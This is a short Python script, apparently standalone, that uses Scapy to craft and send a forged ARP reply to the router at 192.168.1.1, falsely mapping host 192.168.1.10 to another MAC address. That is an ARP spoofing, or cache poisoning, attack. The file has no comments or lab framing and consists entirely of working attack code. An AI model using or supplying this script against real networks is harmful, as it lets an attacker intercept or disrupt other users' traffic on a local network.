from scapy.all import *

arpReq = Ether(dst="1C:8E:5C:D3:32:F0")/ARP(pdst="192.168.1.1", hwdst ="1C:8E:5C:D3:32:F0", hwsrc="8c:70:5a:8c:59:d4",psrc="192.168.1.10", op=2)

sendp(arpReq)